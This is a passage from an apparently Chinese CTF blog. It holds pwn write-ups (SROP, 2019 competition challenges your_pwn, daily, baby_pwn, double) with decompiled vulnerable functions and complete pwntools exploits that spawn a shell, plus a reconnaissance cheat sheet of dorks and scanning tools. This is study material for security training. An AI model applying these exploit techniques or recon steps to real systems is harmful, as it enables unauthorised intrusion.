srop</span><br></pre></td></tr></table></figure></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>就是一个调用read系统调用的函数，在栈顶输入0x400个字节，这里我们使用srop来看</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">small = ELF(&apos;./srop&apos;)</span><br><span class="line">sh = process(&apos;./srop&apos;)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">syscall_ret = 0x000000000040008E</span><br><span class="line">start_addr = 0x0000000000400080</span><br><span class="line">## set start addr three times</span><br><span class="line">payload = p64(start_addr) * 3</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## modify the return addr to start_addr+3</span><br><span class="line">## so that skip the xor rax,rax; then the rax=1</span><br><span class="line">## get stack addr</span><br><span class="line">sh.send(&apos;\x83&apos;)</span><br><span class="line">stack_addr = u64(sh.recv()[8:16])</span><br><span class="line">log.success(&apos;leak stack addr :&apos; + hex(stack_addr))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">## make the rsp point to stack_addr</span><br><span class="line">## the frame is read(0,stack_addr,0x400)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)</span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x120 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试--信息收集篇</title>
      <link href="/2019/05/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
      <url>/2019/05/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/</url>
      <content type="html"><![CDATA[<h1 id="DNS-IP-挖掘信息"><a href="#DNS-IP-挖掘信息" class="headerlink" title="DNS+IP 挖掘信息"></a>DNS+IP 挖掘信息</h1><h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><p>whois + domainname<br><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><p>nslookup</p><p>dig</p><p>fierce 工具暴力破解dns： fierce -dns weburl</p><h2 id="ip2location"><a href="#ip2location" class="headerlink" title="ip2location"></a>ip2location</h2><p><a href="https://www.maxmind.com/en/home" target="_blank" rel="noopener">https://www.maxmind.com/en/home</a></p><p>国内ip查询 <a href="http://www.cz88.net/" target="_blank" rel="noopener">http://www.cz88.net/</a></p><p><a href="https://www.ip-adress.com/" target="_blank" rel="noopener">https://www.ip-adress.com/</a></p><p>google map 查询</p><h2 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h2><p><a href="http://searchdns.netcraft.com" target="_blank" rel="noopener">http://searchdns.netcraft.com</a></p><p><a href="https://toolbar.netcraft.com/site_report" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report</a>    站点信息</p><p>Layer子域名挖掘机</p><p>dmitry信息收集工具: dmitry -winse weburl</p><h2 id="ip2domain"><a href="#ip2domain" class="headerlink" title="ip2domain"></a>ip2domain</h2><p><a href="https://www.ip-adress.com/reverse-ip-lookup" target="_blank" rel="noopener">https://www.ip-adress.com/reverse-ip-lookup</a></p><p>国内 不仅是信息反查： <a href="http://www.7c.com/" target="_blank" rel="noopener">http://www.7c.com/</a></p><h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><h2 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h2><p>GDHB 谷歌黑客数据库： <a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a>  </p><p>自动化工具：</p><ol><li>SiteDigger  </li><li>Search Diggity ： <a href="https://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/" target="_blank" rel="noopener">https://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/</a></li><li>gooscan</li></ol><p>检索特定类型的文件 google:  site:sitename filetype: typename, 可能含有敏感文件</p><p>Email泄露网站信息：  metasploit: search_email_collector 模块</p><p>搜索可能存在漏洞的界面，如登陆界面可能存在SQL注入： google: site:sitename inurl:login </p><h2 id="网站目录探索"><a href="#网站目录探索" class="headerlink" title="网站目录探索"></a>网站目录探索</h2><ol><li>google： parent directory site:sitename   // 不是特别好用</li><li>暴力搜索</li></ol><p>metasploit: brute_dirs, dir_listing, dir_scanner<br>工具：御剑，wwwscan， dirbuster，cansina</p><ol start="3"><li>robots.txt 所指出的不应当被抓取的目录及文件</li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>漏洞搜索引擎：</p><ol><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li></ol><p>工具：</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>信安大赛2019-pwn</title>
      <link href="/2019/04/22/%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B2019-pwn/"/>
      <url>/2019/04/22/%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B2019-pwn/</url>
      <content type="html"><![CDATA[<p><em>太菜了，堆的题要么找不到洞，要么找不到好的思路，得加紧训练</em></p><h1 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>关键函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  memset(&amp;s, 0, 0x100uLL);</span><br><span class="line">  memset(arr, 0, 0x28uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 40; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;input index&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;idx);</span><br><span class="line">    printf(&quot;now value(hex) %x\n&quot;, (unsigned int)arr[idx]);</span><br><span class="line">    puts(&quot;input new value&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;new_v);</span><br><span class="line">    arr[idx] = new_v;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;do you want continue(yes/no)? &quot;);</span><br><span class="line">  read(0, &amp;s, 0x100uLL);</span><br><span class="line">  return strncmp(&amp;s, &quot;yes&quot;, 3uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>原意是可以给arr的每个地址赋新值，但是因为其没有对idx进行限制，因而相当于任意地址写，同时因为其会先将地址处的值显示出来，因而可以先泄露地址</p><p>通过泄露栈中的libc_start_main+240,得到libc基址同时查询得到libc版本为2.23，因此可以直接计算处one_adget 地址，最后用同样的方法再循环写入返回地址为</p><p>one_gadget即可；</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#sh=process(&apos;./pwn&apos;)</span><br><span class="line">sh=remote(&apos;1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com&apos;,&apos;57856&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">sh.sendlineafter(&apos;name:&apos;,&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">leak = &apos;&apos;</span><br><span class="line">def scan(idx):</span><br><span class="line">global leak</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(idx))</span><br><span class="line">sh.recvuntil(&apos;(hex) &apos;)</span><br><span class="line">r = sh.recvuntil(&apos;\n&apos;,drop=True)[-2:]</span><br><span class="line">print r</span><br><span class="line">leak =r+leak</span><br><span class="line">l=int(r,16)</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(l))</span><br><span class="line"></span><br><span class="line">for i in range(632,638):</span><br><span class="line">scan(i)</span><br><span class="line">leak=leak.ljust(8,&apos;\x00&apos;)</span><br><span class="line">print leak</span><br><span class="line">leak_addr = int(&apos;0x&apos;+leak,16)</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">libc_start = leak_addr -240 </span><br><span class="line">print &apos;libc_start_main:&apos; + hex(libc_start)</span><br><span class="line">libc = leak_addr-elf.plt[&apos;__libc_start_main&apos;]-0x1ff20</span><br><span class="line">print hex(libc)</span><br><span class="line">#system = libc+ 0x045390</span><br><span class="line">#binsh = libc + 0x18cd57</span><br><span class="line">one = 0x4526a + libc</span><br><span class="line">print &apos;one: &apos;+ hex(one)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = [0,0,0,0,0,0,0,0]</span><br><span class="line">for i in range(0,8):</span><br><span class="line">ls[i] = one%0x100</span><br><span class="line">print hex(ls[i])</span><br><span class="line">one /= 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(344,352):</span><br><span class="line">j=i-344</span><br><span class="line">print hex(ls[j])</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(i))</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(ls[j]))</span><br><span class="line">#sleep(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh,&apos;b* 0xc2a&apos;+str(libc))</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(-1))</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(1))</span><br><span class="line">sh.sendlineafter(&apos;? \n&apos;,&apos;no&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h1><p><em>做一半电脑死机了。。坑。。。</em></p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><em>漏洞点比较隐蔽，看了好久</em></p><p>关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 remove()</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  if ( cnt )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of daily:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    idx = atoi(&amp;buf);</span><br><span class="line"></span><br><span class="line">    if ( *(_QWORD *)&amp;ptr[4 * idx + 2] )                 // 没有检查idx的大小</span><br><span class="line">    &#123;</span><br><span class="line">      free(*(void **)&amp;ptr[4 * idx + 2]);</span><br><span class="line">      *(_QWORD *)&amp;ptr[4 * idx + 2] = 0LL;</span><br><span class="line">      ptr[4 * idx] = 0;</span><br><span class="line">      puts(&quot;remove successful!!&quot;);</span><br><span class="line">      --cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No pages in the daily&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>前面很容易想到利用malloc_consolidate 来泄露libc地址及heap地址；</p><p>而漏洞点在于在删除chunk时，没有对输入的idx进行检查，所以只要释放的地址处的chunk可以通过检查，就可以被置入bin链表中</p><p>而只要泄露堆地址，就可以运算得到其index，因为输入的是整型数据，所以在一定情况下堆分配离bss段较远时会出错，不过这个问题可以多次尝试来解决</p><p>所以在堆上伪造如同bss段的结构体(size+ptr)，delete时将idx指向这里free掉一个chunk，而因为这样并不会情况bss段存储的结构体，我们就可以UAF</p><p>最后因为尝试one_gadget条件无法满足，最后只能换成调用system函数来覆盖free_hook来getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">#sh = remote(&apos;5f0cfa41a052c741f4beafe9d083d281.kr - lab.com&apos;,58512)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">    sh.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;daily\n&apos;)</span><br><span class="line">    sh.send(con)</span><br><span class="line">def dele(idx):</span><br><span class="line">    sh.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def edit(idx,con):</span><br><span class="line">    sh.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;daily&apos;)</span><br><span class="line">    sh.send(con)</span><br><span class="line">def show():</span><br><span class="line">    sh.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20,&apos;a&apos;)</span><br><span class="line">add(0x800,&apos;a&apos;)</span><br><span class="line">add(0x10,&apos;a&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x100,&apos;aaaaaa&apos;)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">main_arena = u64(sh.recv(6).ljust(8,&apos;\x00&apos;)) - 0x548</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - libc.symbols[&apos;__malloc_hook&apos;] - 0x10</span><br><span class="line">one_gadget = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">free_hook = libc_base + libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(1,&apos;a&apos;*24)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;a&apos;*24)</span><br><span class="line">heap = u64(sh.recv(4).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x700-8,&apos;aaa&apos;)</span><br><span class="line">add(0x10,&apos;aaa&apos;)</span><br><span class="line">add(0x10,&apos;aaa&apos;)</span><br><span class="line">dele(4)</span><br><span class="line">dele(5)</span><br><span class="line">index = (heap + 0x10 - 0x602060)/16</span><br><span class="line">payload = p64(0x100) + p64(heap + 0x830 + 0x10)</span><br><span class="line">edit(1,payload)</span><br><span class="line">dele(index)</span><br><span class="line"></span><br><span class="line">add(0x10,p64(0x602058))</span><br><span class="line">add(0x10,&apos;c&apos;)</span><br><span class="line">add(0x10,&apos;d&apos;)</span><br><span class="line">add(0x10,&apos;e&apos;)</span><br><span class="line"></span><br><span class="line">edit(7,p64(free_hook))</span><br><span class="line">edit(0,p64(one_gadget))</span><br><span class="line">edit(1,&apos;/bin/sh\x00&apos;)</span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>直接给了溢出，同时除了PIE保护全开，没有给libc，可以确定是ret2_dl_runtime_resolve</p><p>可以直接使用roputils库 ，在bss段伪造结构体 ，然后上脚本即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x08048390</span><br><span class="line">bss = 0x0804a068</span><br><span class="line">vulFunc = 0x0804852d</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&apos;da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com&apos;,&apos;33865&apos;)</span><br><span class="line">rop = roputils.ROP(&apos;./pwn&apos;)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line"># step1 : write sh &amp; resolve struct to bss</span><br><span class="line">buf1 = &apos;a&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line">buf3 = &apos;a&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="double"><a href="#double" class="headerlink" title="double"></a>double</h1><p><em>其实很简单的一道题。。。结果当天没做出来。。过了一天，昨天睡觉前突然意识到怎么做。。。最后写出来用了不到20分钟！！难受</em></p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>程序使用链表来记录分配的chunk，删除时也就是链表的元素删除，所以当时会陷入对链表的问题的查找，而实际上问题不在这里</p><p>主要问题函数：</p><p>分配的new函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 new()</span><br><span class="line">&#123;</span><br><span class="line">  int size; // [rsp+4h] [rbp-12Ch]</span><br><span class="line">  struc *ptr; // [rsp+8h] [rbp-128h]</span><br><span class="line">  struc *last; // [rsp+10h] [rbp-120h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-118h]</span><br><span class="line">  char s2; // [rsp+20h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+128h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  ptr = (struc *)malloc(0x18uLL);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Your data:&quot;);</span><br><span class="line">    size = get_str(&amp;s2, 0x100);</span><br><span class="line">    last = ptrStop;</span><br><span class="line">    if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;idx = last-&gt;idx + 1;</span><br><span class="line">      ptr-&gt;size = last-&gt;size;</span><br><span class="line">      ptr-&gt;chunk_ptr = last-&gt;chunk_ptr;</span><br><span class="line">      ptr-&gt;next_chunk = 0LL;</span><br><span class="line">      last-&gt;next_chunk = (__int64)ptr;</span><br><span class="line">      ptrStop = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    